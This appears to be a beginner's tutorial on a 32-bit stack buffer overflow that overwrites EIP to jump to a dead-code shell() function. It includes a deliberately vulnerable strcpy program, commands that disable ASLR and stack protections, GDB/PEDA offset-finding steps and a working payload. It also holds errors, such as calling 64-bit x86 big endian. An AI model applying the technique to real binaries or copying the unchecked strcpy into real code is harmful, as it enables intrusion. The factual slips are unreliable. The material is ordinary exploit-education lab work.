Im still extremly new to this so if anyone reads this and sees the amount of stuff called\worded wrong let me know
==================================================================================================================

For This Part it is simply going to be the most basic type of exploit, overwriting the EIP with another functions address
It also is going to be a high level view of the stack ect as im still learning and not informed Enough to be trying to teach people (If Anyone Ever Reads this)

Here Is a Good Link Explaining the Stack And Stack Smashing
      https://owasp.org/www-chapter-pune/meetups/2019/August/Buffer_overflow_by_Renuka_Sharma.pdf

ALSO

      Im using a plugin for GDB in this called PEDA, it adds color and introduces many useful commands to install it follow these instrcutions

      git clone https://github.com/longld/peda.git ~/peda
      echo "source ~/peda/peda.py" > ~/.gdbinit
      (Create the .gdbinit if you dont have one)

----

For refernce Here is the source Code
============================================================
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        
        void shell() {
        	system("/bin/sh");
        }
        
        
        void copy(char *msg) {
        	char buffer[250];
        	strcpy(buffer, msg);
        }
        
        int main(int argc, char const *argv[])
        {
        	copy(argv[1]);
        	printf("Nice One Retard It Didnt Overflow!\n");
        	return 0;
        }
==============================================================

As You can see all it does is, instatly Jump to the copy function and passes argv[1] (The First Command line argument, ./buffer Hello, it passes hello)
Which then simply just uses strcpy to copy it into the buffer which has a max value of 250 bytes (Note How strcpy Has 0 boundry checking)
There is also the function "shell" but it never gets called so its just dead code

But What If we could copy so many characters into the buffer that it "overflows" into other memory address's? What Effects Could that possibly have?

NOTE
    Modern Day Systems Have Built In protections against these Types of attacks such as ASLR(Address space layout randomization), DEP (Data Execution Protection), NX (No Executable)
    But Since We a Simply beginners we will turn these off (For this type of attack NX/DEP Doesnt really matter as we arent injecting shellcode)

    To Turn Off ASLR 
            echo 0 > /proc/sys/kernel/randomize_va_space ; Will Need Sudo Or Root

    To Turn Off DEP/NX
            compile with the flag: -z execstack, this allow the stack\heap to be executable

============================

Now Lets Compile Our Program so we can start
      gcc -m32 -fno-stack-protection -no-pie -g -z execstack -o buffer buffer.c

      -m32
          Compile to a 32bit exectuable, Uses ASM instructions such as EAX, EBX, ECX, EDX, ESP, EBP, EIP

      -fno-stack-protection
          Turn Off Stack Protection mechanisms, Such as Stack Smashing Protection(SSP), These are made to identify Stack Based Overflow attempts and stop attackers

      -no-pie 
          Turn Off Postion Independant executable, PIE randomizes the base address of exectuables, makes it harder to find/predict memory addresses

      -g
          Include Debugging information

      -z exectack
          Allows the stack/heap to be executable
=============================

Now Onto the Fun Part! Lets start exploiting this program


For Starters Let Just Pass 10 Characters

![First](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/ea0257bd-8653-4900-a6d4-10714dad3a2e)

We Can See the program ran without any errors, Usually Good But Not What we want as an attacker

Now Lets Try Pass 400 Charaters, Make a file called whatever.py and add
      print("A" * 400)

Now Lets Run the program but use the python program as Input
![Second](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/b9f6e51e-6b81-4824-a580-2739914b0651)

Whoa! What Happened?, We Got a segmentation Fault. But What Is That?

FROM GOOGLE

      A segmentation fault occurs when a program attempts to access a memory location that it is not allowed to access 
      or attempts to access a memory location in a way that is not allowed 
      (for example, attempting to write to a read-only location, or to overwrite part of the operating system)

Lets Open Up GDB (gnu debugger) To Check Out What Happened

run GDB then run the command
      run $(python3 arg.py)

![third](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/0791be64-1ac9-44a1-9e3f-1c14db57fd3f)

We Can See That EIP, EBP, ESP Are Full of 0x41 (A in hex), So we 100% Know We succesfully overflowed the buffer But Why did we get a segfault?

Because After The copy Function is done with its job, It Needs To Know Where to go, using the ret address which would be held in the EIP register (The EIP Register Holds The Next Instruction To Be Ran It Gets Incremented After every instrctuion is done)

But Since We Overflowed Into the EIP register it has 0 clue where to jump and tries to access and invalid address which is why we got the segfault!

Now Our Next job Is To Find Out How Many characters we can input till we fill the EIP reigster

There Are Many program for this jobs like msf's pattern_create.rb. But We Will just use PEDA's pattern create, so lets create a pattern of 400 characters

![fourth](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/a1dc6507-6cd9-4cff-8f5d-fbf77cc55574)

Now in Your python script replace the "A" * 400 with your pattern
      print('<pattern')

Then Lets Run the program again using our pattern
      run $(python3 arg.py)

![5th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/20615a0c-5b35-43fc-8cf1-e4cc6a295edc)


Now we Can See The EIP Has a differnt value, which we can use to get the exact offset

Use PEDA pattern offset command
      pattern offset A%HA, Or Pattern offset 0x41482541
      
![6th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/e19fed87-ebe2-47b4-8c87-81447fdacd77)

And Perfect! it gives the exact offset till we fill the EIP register

Lets Proves This By Filling it with BBBB, Inside your python script change it to
      print("A" * 262 + "BBBB") // We Use 4 B's Because the EIP register is 4 bytes wide and 1 char = 1 byte, so it perfectly fills it

![7th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/1fe9e99d-b919-48df-90ab-8b752b796aec)

and perfect we can see it filled it with Our 4 B's!

Now We can control the return address, we could do anything, make it return to a different function, inject shellcode and make it point to a nop sled and so on!

Now Onto Making The EIP point to the SHELL function so we can spawn a shell!

In Our case getting the address is extremly easy as ASLR ect is turned off

Ill Show 2 ways

1. We can just use "info function" commands in GDB to list the functions then copy the SHELL address
   ![8th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/30d45b06-cb72-429e-90d8-38ce139dcb74)

   Then Simply copy the address "0x08049186", On the Left Of SHELL
--------------------
2. Or The Easier Less In your face way, just using p shell to print the address
   ![9th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/9e191061-c28d-414c-bd15-914e0bdf12ab)
----------------------

And Perfect! We Have Eevrything Need To Exploit this program and spawn a shell by using the Dead Code function

Open Up Your python script and Chnage the B's to the address of SHELL
      NOTE

            REMEBER since this is a 32 bit exectuable it uses Little endian, so it stores the least significant byte first, 64bit is big endian
            So For Our Address Remember to reverse it (DONT REFLECT IT!)

            so 0x08049186 Turns Into 0x86910408,
            DONT DO THIS, Origianl 0x08049186: REFLECTED 0x80401968

So Now Our python script looks like 
      print("A" * 262 + "\x86\x91\x04\x08")

Now For the Moment Of Truth lets See If Succesfully Exploited it!!!

![last](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/fe920a29-f781-4a35-be15-ab4d8cff16df)

AND WE DID IT!!!!
=========================================

JUST MORE PROOF (Even Tho we Know)

First Lets Put a BreakPoint On line 5 (ALSO IM RUNNING IT WITH "print("A" * 262 + "BBBB")
![break1](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/eb5bf633-af14-4d98-8a9f-d625ee1930be)
BTW we can read the source code cause i added -g to the comiler flags to add debugging information

So we Added a Breakpoint on line 5, so the program pauses when it reaches that line, but it will never reach it in the normal flow of the program without tampering with it

so lets run it and see if it reaches the breakpoint
![break1 2](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/80774659-14c6-4995-9ef7-775ca98f5dee)
And what a suprise (jokes), it never hit a breakpoint it just seg faulted and the EIP it written with all BBBB
----------------------------

Now Lets Do the same break point location, but this time we will run the exploit code (print("A" * 262 + "\x86\x91\x04\x08")

and lets run it again and see if it reaches the breakpoint
![break2 2](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/34d3d7e0-5c98-4646-a759-cd51757c54eb)

and this time it did hit the breakpoint!, we can also see the EIP with our address we overwrite it with






      

            






        
  
      


  
